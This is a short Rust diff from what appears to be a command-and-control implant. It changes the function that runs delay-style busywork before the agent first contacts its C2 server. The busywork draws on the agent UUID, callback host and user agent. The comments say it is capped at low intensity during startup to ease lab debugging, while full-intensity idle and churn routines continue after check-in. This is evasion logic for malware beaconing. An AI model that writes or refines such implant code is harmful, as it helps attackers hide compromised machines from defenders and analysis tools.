@@ -32,17 +32,24 @@ fn to_intensity(l: Level) -> Option<Intensity> {
     }
 }
 
-/// Startup delay before C2 contact. Uses the configured intensity (not hard-coded Ultra).
+/// Brief computational noise before first C2 contact.
+///
+/// Capped at Low regardless of configured intensity — Ultra/Medium here used to
+/// stall check-in for minutes and made lab debugging effectively impossible.
+/// Full intensity still applies to `idle()` / `churn()` after the agent is live.
 pub fn startup_delay() {
     let l = level();
-    crate::dlog!("startup_delay: intensity={:?}", config::busywork_intensity);
-    let Some(i) = to_intensity(l) else {
+    crate::dlog!(
+        "startup_delay: configured={} (startup capped at low)",
+        config::busywork_intensity
+    );
+    if l == Level::Off {
         crate::dlog!("startup_delay: skipped (off)");
         return;
-    };
+    }
     let uuid = config::UUID.read().unwrap();
     black_box(
-        BusyWork::new(i)
+        BusyWork::new(Intensity::Low)
             .feed(uuid.as_str())
             .feed(config::callback_host)
             .feed(config::user_agent)
